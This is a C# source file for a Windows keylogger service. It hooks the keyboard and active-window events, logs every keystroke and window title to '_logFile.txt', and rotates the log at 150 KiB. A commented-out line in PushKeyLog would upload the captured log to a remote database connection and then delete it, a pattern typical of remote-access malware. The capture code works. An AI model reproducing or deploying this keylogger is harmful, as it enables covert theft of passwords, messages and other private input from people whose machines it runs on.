using System;
using System.IO;
using System.Windows.Forms;
using KeyBoardHook.KeyLogger.Entity;
using KeyBoardHook.KeyLogger.Enums;
using KeyBoardHook.KeyLogger.Hooker;
using Keys = System.Windows.Forms.Keys;

namespace KeyBoardHook.KeyLogger.Service
{
    public class KeyLoggerService
    {
        private const int MaxLogSize = 153600; //150 KiB

        private ActiveWindowHook _activeWindowHook;
        private KeyboardHook _keyboardHook;
        private KeyLog _keyLog;
        private readonly FileInfo _logFile;

        private TextBox TextBox;
        
        public KeyLoggerService(TextBox TextBox)
        {
            this.TextBox = TextBox;
            _logFile = new FileInfo("./_logFile.txt");
            
            _keyLog = KeyLog.Create(_logFile.FullName);
            _keyLog.Saved += _keyLog_Saved;
            
            _keyboardHook = new KeyboardHook();
            _keyboardHook.StringDown += _keyboardHook_StringDown;
            _keyboardHook.StringUp += _keyboardHook_StringUp;
            
            _activeWindowHook = new ActiveWindowHook();
            _activeWindowHook.ActiveWindowChanged += _activeWindowHook_ActiveWindowChanged;
        }

        public void Stop()
        {
            _keyLog.Save();
            _activeWindowHook.UnHook();
            _keyboardHook.UnHook();
        }

        public void Start()
        {
            _keyboardHook.Hook();
            _activeWindowHook.Hook();
        }

        public bool TryPushKeyLog()
        {
            if (_logFile.Exists && _logFile.Length > 0)
            {
                _keyLog.Save();
                PushKeyLog(true);
                return true;
            }

            return false;
        }

        private void _keyLog_Saved(object sender, EventArgs e)
        {
            CheckSize();
        }

        private void _activeWindowHook_ActiveWindowChanged(object sender, ActiveWindowChangedEventArgs e)
        {
            TextBox.Text+=("\r\n======== 窗口 : [" + e.Title + "]========\r\n");
            _keyLog.WindowChanged(e.Title);
        }

        private void _keyboardHook_StringUp(object sender, StringDownEventArgs e)
        {
            if (e.IsChar) //No key up for chars
                return;

            var key = (Keys) e.VCode;
            TextBox.Text+=(e.Value);
            var specialKey = KeysToSpecialKey(key);
            var entry = specialKey == 0
                ? (KeyLogEntry) new StandardKey( key, false)
                : new SpecialKey(specialKey, false);
            _keyLog.WriteSpecialKey(entry);
        }

        private void _keyboardHook_StringDown(object sender, StringDownEventArgs e)
        {
            
            if (e.IsChar)
            {
                TextBox.Text+=(e.Value);
                _keyLog.WriteString(e.Value);
            }
            else
            {
                var key = (Keys)e.VCode;
                var specialKey = KeysToSpecialKey(key);
                
                TextBox.Text+=(e.Value);

                var entry = specialKey == 0
                    ? (KeyLogEntry) new StandardKey(key, true)
                    : new SpecialKey(specialKey, true);
                        _keyLog.WriteSpecialKey(entry);
            }
        }

        private void CheckSize()
        {
            _logFile.Refresh();
            if (!_logFile.Exists)
                return;

            if (_logFile.Length > MaxLogSize)
                PushKeyLog(false);
        }

        private void PushKeyLog(bool forcePush)
        {
            var tempLog = KeyLog.Parse(_logFile.FullName);
            try
            {
                // FIXME
                // _databaseConnection.PushFile(serializer.Serialize(tempLog.LogEntries), forcePush ? "Requested Key Log" : "Automatic Key Log", DataMode.KeyLog);
                _logFile.Delete();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public static SpecialKeyType KeysToSpecialKey(Keys key)
        {
            switch (key)
            {
                case Keys.Enter:
                    return SpecialKeyType.Return;
                case Keys.Shift:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return SpecialKeyType.Shift;
                case Keys.LWin:
                case Keys.RWin:
                    return SpecialKeyType.Win;
                case Keys.Tab:
                    return SpecialKeyType.Tab;
                case Keys.Capital:
                    return SpecialKeyType.Captial;
                case Keys.Back:
                    return SpecialKeyType.Back;
                default:
                    return 0;
            }
        }

        
    }
}